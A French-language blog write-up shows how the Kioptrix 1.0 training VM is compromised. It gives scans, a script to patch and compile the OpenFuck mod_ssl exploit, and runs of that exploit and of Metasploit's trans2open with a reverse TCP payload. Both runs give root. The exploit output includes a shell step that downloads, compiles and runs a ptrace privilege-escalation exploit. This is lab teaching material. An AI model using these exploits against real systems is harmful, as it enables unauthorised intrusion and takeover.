---
layout: post
title: Writeup Kiopitrix 1.0, Lvl 1
---

![pwn]({{ site.baseurl }}/images/kiopitrix-1-1/pwn.jpeg){:class="img-responsive"}


Aujourd'hui je repasse sur la VM kiopitrix 1.0, je l'avais déjà réussis mais sans jamais faire de writeup à son sujet. Aujourd'hui c'est chose faites ! 


## Scan 

Débutons ce nouveau writeup par le scan des ports de notre machine cible. 
Comme on ne sait pas quelle est l'ip de cette dernières nous allons procéder àa un scan moins précis sur un bloc d'ip avant de poursuivre par un scan sur l'ip concerné :

```bash
Nmap scan report for 192.168.122.1
Host is up (0.00057s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 52:54:00:99:80:10 (QEMU virtual NIC)

Nmap scan report for 192.168.122.83
Host is up (0.0018s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 52:54:00:4C:29:A2 (QEMU virtual NIC)

Nmap scan report for kali (192.168.122.178)
Host is up (0.0000050s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```
En procédant par élimination, on déduis que l'ip de notre cible est 192.168.122.83. 
Procédons au scan plus détaillé sur cette ip :

```bash
Nmap scan report for 192.168.122.83
Host is up (0.0021s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 52:54:00:4C:29:A2 (QEMU virtual NIC)
```
Nous voila avec une jolie liste d'application potentiellement vulnérable. 

## Recherche d'exploit 

Essayons de trouver des exploit connus à l'aide de **searchsploit**. 
**Searchsploit** est en fait une copie locale de la base de données du site www.exploit-db.com dans laquelle nous allons pouvoir trouver des exploits :

```bash
root@kali:~# searchsploit mod_ssl 2.8.
----------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                         |  Path
                                                                       | (/usr/share/exploitdb/)
----------------------------------------------------------------------- ----------------------------------
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow             | exploits/multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow   | exploits/unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow | exploits/unix/remote/764.c
----------------------------------------------------------------------- ----------------------------------
```
Bingo ! Comme on le voit on trouve ici 3 exploits, le premiers ne nous intéresse pas car il ne concerne que les fichiers htaccess. 
Néanmoins, les exploit OpenFuck semble répondre à nos besoins car il s'agit ici d'un buffer overflow menant à une escalade des privilèges.

Nous n'allons pas tout de suite sauter dans la partie exploitation mais plutôt se mettre en quête d'un autre exploit. 
La sortie de nmap indique ici qu'un serveur Samba fonctionne sur la machine mais aucune version n'est spécifié. 

Utilisons Metasploit pour détecter la version de Samba :

```bash
msf >  use auxiliary/scanner/smb/smb_version 
msf auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.122.83
RHOSTS => 192.168.122.83
msf auxiliary(scanner/smb/smb_version) > run

[*] 192.168.122.83:139    - Host could not be identified: Unix (Samba 2.2.1a)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/smb/smb_version) > 
```
On est ici sur une version 2.2.1a se samba, cherchons des exploits : 

```bash
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                     Disclosure Date  Rank       Description
   ----                                     ---------------  ----       -----------
   exploit/linux/samba/chain_reply          2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename    2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap  2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap   2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open           2003-04-07       great      Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans              2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   post/linux/gather/enum_configs                            normal     Linux Gather Configurations

```

Deux exploit semble intéressant, trans2open et nttrans.
Après quelques recherches j'ai finalement découvert que la version de samba de notre cible est vulnerable à trans2open.

## Exploitation avec Openfuck 

On choisiras ici l'exploit dans sa version 2 car il est un peut ancien et plus forcément facile à compiler :

>Note : Pour modifier l'exploit, rendez-vous à cette adresse http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/

Voici un court script pour le faire compiler:

```bash
cp /usr/share/exploitdb/exploits/unix/remote/764.c ./exploit.c
sed -i "s/unsigned\ char\ \*p\,\ \*end\;/const\ unsigned\ char\ \*p\,\ \*end\;/g" exploit.c
sed -i -e '20i#include <openssl/rc4.h>\' exploit.c
sed -i -e '20i#include <openssl/md5.h>\' exploit.c
sed -i 's/http\:\/\/packetstormsecurity\.nl\/0304\-exploits\/ptrace\-kmod\.c/http\:\/\/dl\.packetstormsecurity\.net\/0304\-exploits\/ptrace\-kmod\.c/g' exploit.c
gcc -o OpenFuck exploit.c -lcrypto
```

Tentons d'exploiter notre cible avec cet exploit. 
On lance l'aide : 
```bash
root@kali:~# ./OpenFuck 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  
```
On dois donc ici spécifier plusieurs choses mais concentrons nous sur **target**: 

```bash
root@kali:~# ./OpenFuck | grep "1.3.20"
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	0x27 - FreeBSD (apache-1.3.20)
	0x28 - FreeBSD (apache-1.3.20)
	0x29 - FreeBSD (apache-1.3.20+2.8.4)
	0x2a - FreeBSD (apache-1.3.20_1)
	0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
	0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
	0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	0x7e - Slackware Linux 8.0 (apache-1.3.20)
	0x86 - SuSE Linux 7.3 (apache-1.3.20)
``` 
Suite à un rapide trie on trouve deux **t0arget** intéressant :

- ``0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1``
- ``0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2``

Rappelez vous du résultat de nos scan, nous sommes ici sur un Apache 1.3.20 sous RedHat Linux !

Testons avec le premier :
```bash
root@kali:~# ./OpenFuck 0x6a 192.168.122.83

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
Good Bye!
```
Rien du tout, testons avec le second :
```bash
root@kali:~# ./OpenFuck 0x6b 192.168.122.83

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
--14:45:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--14:45:59--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   1.25 MB/s

14:45:59 (765.82 KB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 6148
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
```
Nous voila root sur la cible ! 

## Exploitation avec Trans2open 

Nous y voila, sélectionnons notre exploit :

```bash
msf exploit(multi/samba/nttrans) > use exploit/linux/samba/trans2open
msf exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```
Définissons les paramètres requis ainsi que le payload :

```bash
msf exploit(multi/samba/nttrans) > use exploit/linux/samba/trans2open
msf exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
   
msf exploit(linux/samba/trans2open) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.122.83   yes       The target address
   RPORT  139              yes       The target port (TCP)


Payload options (linux/x86/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.122.178  yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

```

Place au lancement de l'exploit :

```bash
msf exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.122.178:4444 
[*] 192.168.122.83:139 - Trying return address 0xbffffdfc...
[*] 192.168.122.83:139 - Trying return address 0xbffffcfc...
[*] 192.168.122.83:139 - Trying return address 0xbffffbfc...
[*] 192.168.122.83:139 - Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 192.168.122.83
[*] Command shell session 5 opened (192.168.122.178:4444 -> 192.168.122.83:32775) at 2018-01-07 16:17:37 +0100

whoami
root

```

Nous voila root !

## Conclusion 

Encore un bon moyen de mettre en pratique des techniques de base de pentest. Cette fois nous avons également eu le droit à Metasploit qui est sans nul doute l'outil incontournable du pentester.

